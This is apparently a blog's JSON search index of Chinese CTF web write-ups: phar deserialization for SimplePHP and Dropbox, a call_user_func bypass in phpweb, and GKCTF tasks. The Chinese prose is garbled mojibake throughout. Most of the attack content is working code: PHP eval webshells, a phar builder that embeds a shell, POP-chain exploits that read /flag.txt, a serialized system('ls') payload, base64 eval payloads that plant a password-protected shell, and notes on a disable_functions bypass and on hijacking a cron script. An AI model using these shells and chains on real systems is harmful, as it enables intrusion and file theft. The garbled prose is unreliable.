&#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key;&#125;echo public_key();echo private_key();?&gt; ä¹‹åå¯†ç ç”¨ä¸‡èƒ½å¯†ç ä¸€è¿‡ï¼Œå³å¯å¾—åˆ°flag åé¢çš„ä¸¤ä¸ªä¸€ä¸ªå¤ªéš¾ä¸€ä¸ªæ˜¯é¢˜ç›®downæ‰äº†å®Œå…¨ç”¨ä¸äº†ã€‚ã€‚","categories":[],"tags":[]},{"title":"ååŒ—èµ›åŒºDropbox","slug":"ååŒ—èµ›åŒºDropbox","date":"2020-10-29T05:49:57.000Z","updated":"2020-11-17T06:08:52.547Z","comments":true,"path":"2020/10/29/ååŒ—èµ›åŒºDropbox/","link":"","permalink":"http://example.com/2020/10/29/%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADropbox/","excerpt":"","text":"1.çŸ¥è¯†ç‚¹å­¦ä¹ 1.1 pharæµè‡ªPHP5.3.0å¼€å§‹ï¼Œphpä¾¿æ”¯æŒè¯¥æ•°æ®æµ æ”¯æŒallow_url_fopen no æ”¯æŒallow_url_include No å…è®¸è¯»å– Yes å…è®¸å†™å…¥ Yes åœ¨PHPçš„å®˜ç½‘æ‰‹å†Œå½“ä¸­ï¼Œè¯¥æµç”¨äºè§£å‹pharæ–‡ä»¶ï¼Œæˆ‘ä»¬å…è®¸åˆ©ç”¨è¯¥æµç›´æ¥è¯»å–è¢«å‹ç¼©çš„pharæ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬å®æˆ˜ä¸­å´å‘ç°ï¼Œè¯¥æµå…è®¸æˆ‘ä»¬è¯»å–ä»»æ„ä¸€ä¸ªæ–‡ä»¶ï¼Œåªè¦ä»–ä»¬æ˜¯ç»è¿‡å‹ç¼©çš„æ–‡ä»¶ï¼ŒPHPä¼šè‡ªåŠ¨çš„è§£å‹æ–‡ä»¶ï¼Œå¹¶ä¸”è¯»å–é‡Œé¢çš„PHPã€‚ pharçš„å‚è€ƒæ–‡ç« ï¼š 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;Leroi_Liu&#x2F;article&#x2F;details&#x2F;86293701 ï¼ˆæ„Ÿè§‰PHPæœ‰ç‚¹åƒåœ¾..ä½¿ç”¨Pharæ–‡ä»¶ï¼Œä½†æ˜¯å´å®Œå…¨æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ï¼Œä»–å°†è¯†åˆ«ä»»ä½•æ¨¡å—çš„åç¼€ï¼Œç›´æ¥å°†å…¶è§£å‹ï¼Œä¹‹åè¯»å–å…¶ä¸­çš„PHPæ–‡ä»¶ ä¾‹å¦‚æˆ‘ä»¬æ„é€ ä¸€ä¸ªtest.phpï¼Œæˆ‘ä»¬å°†å…¶å‹ç¼©æˆtest.zipï¼Œä¹‹åä¿®æ”¹zipåç¼€ä¸ºjpgï¼Œä»–è¿˜æ˜¯ä¼šèƒ½å¤Ÿè¯†åˆ«ï¼Œå¹¶ä¸”è¯»å–å…¶ä¸­çš„æ–‡ä»¶ 1.1.1 pharå†™ğŸæ–‡ä»¶åŒ…å«æµ‹è¯•çš„ä»£ç å¦‚ä¸‹ï¼š index.php 1234&lt;?php //phar://./test.jpg/test.phpinclude($_POST[&#x27;url&#x27;]);?&gt; test.php 1&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¦‚ä¸‹ä»£ç ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ï¼Œå¹¶ä¸”ç”ŸæˆğŸ 12345678910111213&lt;?php@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub;//$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;test.php&quot;, &quot;&lt;?php eval(\\$_POST[123]); ?&gt;&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering(); åˆ©ç”¨å¦‚ä¸‹ï¼š 1.1.2 pharååºåˆ—åŒ–åœ¨ä»¥å‰çš„å¤§éƒ¨åˆ†äº‹ä»¶ï¼Œæˆ‘ä»¬éƒ½æ˜¯åˆ©ç”¨ååºåˆ—åŒ–çš„å‡½æ•°ï¼Œä½†æ˜¯äººä»¬ç°åœ¨å®‰å…¨æ„è¯†è¶Šæ¥è¶Šé«˜ä¹‹åï¼Œè¿™ç§åˆ©ç”¨æ–¹å¼è¶Šæ¥è¶Šéš¾ã€‚ ä½†æ˜¯Phar://è¯»å–æ–‡ä»¶pharçš„æ—¶å€™ï¼Œä¼šååºåˆ—åŒ–meta-dataå‚¨å­˜çš„ä¿¡æ¯ Pharæ–‡ä»¶çš„ä¸€ä¸ªæ ‡å‡†ç‰¹å¾å¦‚ä¸‹ï¼š 12&lt;?php __HALT_COMPILER(); ?&gt; O:10:&quot;TestObject&quot;:0:&#123;&#125;\b test.tx\u0002 GBMB æˆ‘ä»¬å¯ä»¥å‘ç°Meta-dataçš„å†…å®¹å°±æ˜¯ä»¥ååºåˆ—åŒ–çš„å½¢å¼å‚¨å­˜çš„ï¼Œåˆ©ç”¨Pharåè®®è§£æçš„æ—¶å€™éƒ½ä¼šååºåˆ—åŒ–ï¼ŒåŒæ—¶æ–‡ä»¶æ“ä½œå‡½æ•°ä¸€èˆ¬éƒ½èƒ½ç”¨ä¼ªåè®®æµï¼Œæ‰€ä»¥Phar://çš„ä¾›ç»™é¢è¿˜æ˜¯ç›¸å½“å¹¿çš„ã€‚ æ‰€ä»¥æ»¡è¶³å¦‚ä¸‹æ¡ä»¶çš„æ—¶å€™è¯¥ç±»å‹åºåˆ—åŒ–å¯ä»¥ä½¿ç”¨ï¼š å¯ä»¥ä¸Šä¼ Pharæ–‡ä»¶(æˆ–è€…æ–‡ä»¶è‡ªå·±ä½¿ç”¨Pharè¯»å–) å…·æœ‰å¯åˆ©ç”¨çš„é­”æœ¯æ–¹æ³• æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯ç”¨ ä¾‹é¢˜ï¼š[SWPUCTF 2018]SimplePHP é¦–å…ˆå°±å°è¯•è¯»å–ä¸€æ³¢æ–‡ä»¶file.php 1234567891011121314151617&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include &#x27;function.php&#x27;; include &#x27;class.php&#x27;; ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); $file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die(&#x27;file doesn\\&#x27;t exists.&#x27;); &#125; ?&gt; Class.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123; die(&#x27;hacker!&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; function.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) &#123; //echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; return false; &#125; &#125; &#125; ?&gt; åŒæ—¶è¿˜æ‹¥æœ‰ä¸€ä¸ªf1ag.php ç›´æ¥è®¿é—®çš„è¯ä¼šä¸å…è®¸ï¼Œåœ¨showç±»å½“ä¸­æ”¾å‡ºäº†æç¤ºï¼Œpahr://phar.jpg æŸ¥æ‰¾POPé“¾çš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š Testçš„$text = base64_encode(file_get_contents($value));ä½œä¸ºæˆ‘ä»¬çš„ç»ˆæç›®æ ‡ æˆ‘ä»¬æŸ¥çœ‹$valueæ˜¯ä»å“ªé‡Œä¼ æ¥çš„ï¼Œå‘ç°ä¸€è¡Œï¼š 1$value = $this-&gt;params[$key]; ä¹‹åæŸ¥çœ‹ï¼Œå‘ç°$keyé€šè¿‡__getè¿›è¡Œä¼ å¯¼ äºæ˜¯æ„é€  1$c-&gt;params[&#x27;source&#x27;] = &quot;/var/www/html/f1ag.php&quot;; å›åˆ°ä¸Šé¢çœ‹ï¼Œå› ä¸ºä¹‹å‰æœ‰echoï¼Œé€šè¿‡echoæŸ¥æ‰¾tostring äºæ˜¯å¯¹sourceè¿›è¡Œæ§åˆ¶ 1$content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; å¯¹Aè¿›è¡Œååºåˆ—åŒ–å³å¯ã€‚ 1.2 open_basedirè¯¥å‡½æ•°æ˜¯phpç”¨äºåŸºäºxç›®å½•å…è®¸ï¼Œåˆ©ç”¨è¯¥å‡½æ•°ï¼ŒPHPå¯ä»¥é™åˆ¶ç”¨æˆ·çš„è¯»å–æ–‡ä»¶èŒƒå›´ï¼Œè¿™ä¹Ÿå°±å¾ˆå¥½çš„è§£é‡Šäº†ä¸ºä»€ä¹ˆæˆ‘ä»¬åªèƒ½è¯»å–åˆ°../../index.phpçš„å†…å®¹ï¼Œè€Œæ— æ³•è¯»å–åˆ°æ ¹ç›®å½•ä¸‹flag.txtçš„æ–‡ä»¶äº† 2.åšé¢˜æ€è·¯1.ä»»æ„æ–‡ä»¶è¯»å–è¿™é“é¢˜å…è®¸ä¸‹è½½æ–‡ä»¶ï¼Œä¸Šä¼ æ–‡ä»¶å’Œåˆ é™¤æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¸‹è½½æ–‡ä»¶çš„æ—¶å€™å¯ä»¥ä»»æ„ä¿®æ”¹æ–‡ä»¶åï¼ˆä½†æ˜¯ç”±äºopen_basedirçš„é™åˆ¶ï¼Œæˆ‘ä»¬æ²¡æ³•åŠæ³•è¯»å–åˆ°flag æ•…åˆ©ç”¨å¦‚ä¸‹æ–¹å¼èƒ½å¤Ÿæ‰¾åˆ°class.php,index.php,download.php,delete.phpçš„å†…å®¹ 2.æ„é€ pharååºåˆ—åŒ–æ ¹æ®å‰é¢çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬å¯ä»¥åˆ©ç”¨pharç”Ÿæˆæ–‡ä»¶ï¼Œæ„é€ popé“¾è¯»å–æ–‡ä»¶ï¼Œé—®é¢˜å°±åœ¨äºå¦‚ä½•æ„é€ popäº†ï¼Œæˆ‘ä»¬åœ¨è¿™é“é¢˜å¾ˆæ˜æ˜¾è¦æ‰¾åˆ°çš„å‡½æ•°å°±æ˜¯file_get_contentsï¼Œèƒ½æ‰¾åˆ°Fileç±»ä¸‹çš„close()ç±»ä¼šä½¿ç”¨ï¼Œäºæ˜¯æŸ¥æ‰¾å…¨æ–‡å½“ä¸­ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰é­”æœ¯æ–¹æ³•èƒ½å¤Ÿä½¿ç”¨åˆ°closeç±»ï¼š æœ€ç»ˆåœ¨Userç±»ä¸­æŸ¥æ‰¾åˆ°ï¼š 1234567891011121314class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; // ä¸­é—´ç•¥ public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125; äºæ˜¯ç¬¬ä¸€æ¬¡æˆ‘å°è¯•å¦‚æ­¤æ„é€ æ–‡ä»¶ï¼š 1234567891011121314151617181920&lt;?phpclass User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class File &#123; public $filename=&quot;test.txt&quot;; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125; ç»“æœåœ¨æœ¬åœ°fuzzçš„æ—¶å€™å°±å‘ç°è¿™æ ·å­å°±å‹æ ¹æ²¡å›æ˜¾å•Šã€‚åæ¥æ‰çŸ¥é“å¿…é¡»è¾“å‡ºä¸€ä¸‹æ‰èƒ½çœ‹è§å†…å®¹ã€‚ã€‚ 1234567class File &#123; public $filename=&quot;test.txt&quot;; public function close() &#123; echo file_get_contents($this-&gt;filename); return file_get_contents($this-&gt;filename); &#125;&#125; äºæ˜¯å°±å¡ä½äº†ï¼Œä¸Šä¸‹å†å®¡è®¡ä»£ç ï¼Œæ‰¾ä¸€ä¸ªechoå‡½æ•°ï¼Œå‘ç°æ°å¥½å°±åœ¨FileListå½“ä¸­ã€‚ã€‚ï¼š 1234567891011121314151617public function __destruct() &#123; $table = &#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;; $table .= &#x27;&lt;thead&gt;&lt;tr&gt;&#x27;; foreach ($this-&gt;funcs as $func) &#123; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;; &#125; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;; $table .= &#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;; foreach ($this-&gt;results as $filename =&gt; $result) &#123; //è¿™å¥æ˜¯å…¨å±€çš„æ ¸å¿ƒ $table .= &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;; &#125; $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;; $table .= &#x27;&lt;/tr&gt;&#x27;; &#125; echo $table; æƒ³åŠæ³•ï¼Œèƒ½å¤Ÿæ§åˆ¶resultï¼Œå‘ç°é¢˜ç›®ä¹Ÿæ­£å¥½ç»™å‡ºäº†callè¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼š 123456public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; è‡ªå·±çœ‹äº†ä¸€äº›ï¼Œè¿™ä¸ªå…¶å®å°±æ˜¯ä¸€ä¸ªæ‰‹å†™çš„å›è°ƒå‡½æ•°å˜›ã€‚ äºæ˜¯å°è¯•æ€è€ƒï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡FileListå‡ºå‘ 12345678910111213141516class User &#123; public $db;&#125;class File &#123; public $filename;&#125;class FileList &#123; private $files; private $results; private $funcs;public function __construct($path) &#123; $files = new File(); $this-&gt;funcs = array($files); $filenames =&quot;/flag.txt&quot;; &#125;&#125; æˆ‘ä»¬å…ˆnewä¸€ä¸ªUserç±»å‡ºæ¥ï¼Œå¹¶å°†dbæŒ‡å‘FileListï¼Œä¹‹åç±»ä¼šè¢«é”€æ¯ï¼Œå°†ä¼šè°ƒç”¨FileListå½“ä¸­çš„callæ–¹æ³•ï¼Œcallæ–¹æ³•éœ€è¦æˆ‘ä»¬æŒ‡å®šå‚æ•°åå’Œfilenameï¼Œæ‰€ä»¥åœ¨__constructä¸­è¿›è¡Œä¿®æ”¹,æœ€ç»ˆè°ƒè¯•å¾— 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;?phpclass User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close();// phpinfo(); &#125;&#125;class FileList &#123; private $files; private $results; public function __construct() &#123; $file = new File();// $this-&gt;results = array(); $file-&gt;filename = &quot;test.txt&quot;; $this-&gt;files = array($file);// var_dump($file);// phpinfo(); &#125; public function __call($func, $args) &#123;// phpinfo(); foreach ($this-&gt;files as $file) &#123;// var_dump( $file-&gt;$func()); //å°†resultè®¾ç½®æˆtest.txtå½“ä¸­çš„å†…å®¹ $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123;//é”€æ¯çš„æ—¶å€™å°±ä¼šè¢«è¾“å‡ºäº†ï¼ foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table = &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= htmlentities($value); &#125; $table .= htmlentities($filename); &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function name() &#123; return basename($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;$a = new User();$a-&gt;db = new FileList();?&gt; è°ƒè¯•æˆåŠŸä¹‹åæ„é€ exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass User &#123; public $db;&#125;class FileList &#123; private $files; private $results; public function __construct() &#123; $file = new File();// $this-&gt;results = array(); $file-&gt;filename = &quot;/flag.txt&quot;; $this-&gt;files = array($file); &#125;&#125;class File &#123; public $filename; public function name() &#123; return basename($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;$a = new User();$a-&gt;db = new FileList();@unlink(&quot;5.phar&quot;);$phar = new Phar(&quot;5.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub;$phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest //å¦‚æœæˆ‘ä»¬æ˜¯è¦å†™pharğŸå°±ç”¨ä¸‹é¢çš„ï¼Œä¸ç„¶å°±ç”¨ä¸Šé¢çš„setMeatadata$phar-&gt;addFromString(&quot;test.php&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt; ä¹‹åç”¨burpä¸Šä¼ ï¼Œåˆ é™¤çš„æ—¶å€™è¯»å–æ–‡ä»¶å³å¯ï¼š","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"2020ç½‘é¼æ¯phpweb","slug":"2020ç½‘é¼æ¯phpweb","date":"2020-10-28T11:19:40.000Z","updated":"2020-11-17T06:15:44.475Z","comments":true,"path":"2020/10/28/2020ç½‘é¼æ¯phpweb/","link":"","permalink":"http://example.com/2020/10/28/2020%E7%BD%91%E9%BC%8E%E6%9D%AFphpweb/","excerpt":"","text":"1.è®¿é—®é¡µé¢curl+uï¼Œå¯ä»¥æŸ¥çœ‹åˆ°è¿™äº›ï¼š 1234&lt;form id=form1 name=form1 action=&quot;index.php&quot; method=post&gt; &lt;input type=hidden id=func name=func value=&#x27;date&#x27;&gt; &lt;input type=hidden id=p name=p value=&#x27;Y-m-d h:i:s a&#x27;&gt;&lt;/body&gt; è¿™æ ·çš„è¯æˆ‘ä»¬æ¨æµ‹å®ƒå°±æ˜¯ç”¨äº†ä¸€ä¸ªcall_user_funcçš„å›è°ƒå‡½æ•°.. ç„¶åè‡ªå·±åœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œæœ€åæ‰æƒ³èµ·æ¥file_get_contentså‡½æ•°å¯ä»¥è¯»æ–‡ä»¶ï¼Œ äºæ˜¯æ„é€ ï¼š å¾—åˆ°æºç  123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; ä¹‹åæˆ‘åˆå¡ä½äº†ï¼Œçœ‹ä¼¼å¥½åƒæ˜¯ååºåˆ—åŒ–ï¼Œåˆå¥½åƒä¸æ˜¯å•Šï¼Ÿæ‰¾ä¸åˆ°ååºåˆ—åŒ–çš„ç‚¹ï¼Œä¸€æ—¶é—´åˆåƒµä½äº†ï¼Œè¿‡äº†ä¸€ä¼šå„¿çœ‹äº†å¤§ä½¬çš„WPæ‰æ„è¯†åˆ°æ˜¯è‡ªå·±æ€è·¯è¿˜ä¸å¤Ÿçµæ´»ï¼Œè¿™é“é¢˜æ²¡æœ‰unserializeï¼Œä½†æ˜¯å¯ä»¥åŠ¨è°ƒå‡½æ•°ï¼Œå®¡è®¡ä»£ç ä¸­çš„Testç±»ï¼Œå…¶å®ä»–æ˜¯æœ‰gettimeçš„ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸€ä¸ªåŠ¨è°ƒå‡½æ•°ï¼Œé‚£æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ˜ç¡® 2.æ„é€ payload1234567891011121314&lt;?phpclass Test &#123; var $p = &quot;ls&quot;; var $func = &quot;system&quot;;// function __destruct() &#123;// if ($this-&gt;func != &quot;&quot;) &#123;// echo gettime($this-&gt;func, $this-&gt;p);// &#125;// &#125;&#125;$test = new Test();echo (serialize($test)); ä¹‹åå°†è¿™ä¸€æ®µå¸¦å…¥åˆ°é¢˜ç›®å½“ä¸­ï¼Œæœ€ç»ˆåœ¨tmpç›®å½•ä¸‹æ‰¾åˆ°","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"GKCTF","slug":"GKCTF","date":"2020-10-27T08:04:11.000Z","updated":"2020-11-17T06:17:52.979Z","comments":true,"path":"2020/10/27/GKCTF/","link":"","permalink":"http://example.com/2020/10/27/GKCTF/","excerpt":"","text":"æŠ½ç©ºæŠŠGKCTFçš„é¢˜ç›®åˆ·äº†ï¼Œå…ˆä»ç¬¬ä¸€é¢˜å¼€å§‹è¯´å§ 1.Check inè¯´æ˜¯ä¸€é“ç­¾åˆ°é¢˜ï¼Œä½†æ˜¯å¾—ç”¨åˆ°pwnçš„çŸ¥è¯†ã€è™½ç„¶expç›´æ¥å°±èƒ½æ‰“äº† ç¬¬ä¸€æ­¥è®¿é—®å°±èƒ½å®¡è®¡åˆ°ä»£ç ï¼š 1234567891011121314151617181920&lt;?php highlight_file(__FILE__);class ClassName&#123; public $code = null; public $decode = null; function __construct() &#123; $this-&gt;code = @$this-&gt;x()[&#x27;Ginkgo&#x27;]; $this-&gt;decode = @base64_decode( $this-&gt;code ); @Eval($this-&gt;decode); &#125; public function x() &#123; return $_REQUEST; &#125;&#125;new ClassName(); å°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„åºåˆ—åŒ–ï¼Œæˆ‘ä»¬ç›´æ¥base64ç¼–ç Ginkgoä¹‹åçš„å€¼å³å¯ã€‚ 1?Ginkgo=cGhwaW5mbygpOw== å®¡è®¡åˆ°PHPçš„ä»£ç ï¼Œä¸‹ä¸€æ­¥æˆ‘ä»¬ä¼šå‘ç°è‡ªå·±èšå‰‘è¿æ¥ä¸ä¸Šï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½è‡ªå·±å†å†™ä¸€ä¸ªshelläº† 1?Ginkgo=ZXZhbCgkX1BPU1Rbc2FrYW5pXSk7AA== å¯†ç æ˜¯sakaniï¼Œä¹‹åå°±å¯ä»¥ç”¨èšå‰‘é“¾æ¥ä¸Šå»äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°flagæ²¡æ³•è¯»å•Šã€‚è€Œä¸”å› ä¸ºdisable_functionï¼Œæˆ‘ä»¬ æ²¡æœ‰åŠæ³•ä½¿ç”¨è™šæ‹Ÿç»ˆç«¯äº†ã€‚ ä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ä¸ºPHP7.3ï¼Œå¯ä»¥å°è¯•ç”¨å†…æ ¸æ¼æ´ææƒï¼Œåœ¨tmpç›®å½•ï¼ˆ777ï¼‰ï¼Œä¸Šä¼ exp 1https://github.com/mm0r1/exploits ä¸Šä¼ è¿™é‡Œçš„gcæ¼æ´ï¼Œä¹‹åæ‰§è¡Œå‘½ä»¤å³å¯ 2.è€å…«å°è¶…å¸‚å„¿æ ¹æ®è¿™ç¯‡æ–‡ç« å¯ä»¥åšå‡ºæ¥å‰åŠæ®µæˆåŠŸæ‹¿åˆ°shellï¼š 1https:&#x2F;&#x2F;www.nctry.com&#x2F;1660.html è¿™é‡Œæˆ‘ä¼ å…¥æˆåŠŸä¹‹åè·¯å¾„ä¸ºï¼š 1http:&#x2F;&#x2F;d315d6f1-ec5d-40f2-9c4f-358445b37fba.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;1.php ç”¨èšå‰‘è¿å…¥ï¼Œæ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagå´ä¸èƒ½è¯»ï¼Œè¯»atuo.shå¯ä»¥çŸ¥é“å®ƒæ¯åˆ†é’Ÿä¼šæ‰§è¡Œä¸€æ¬¡makeflaghint.pyï¼ŒåŒæ—¶å…¶æƒé™æ˜¯766ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ”¹~ï¼Œé‚£æˆ‘ä»¬å»æ”¹è¿™ä¸ªpyçš„å†…å®¹è®©ä»–è¯»flagå³å¯ï¼Œç­‰ä¸€åˆ†é’Ÿï¼Œè¯»åˆ°flag 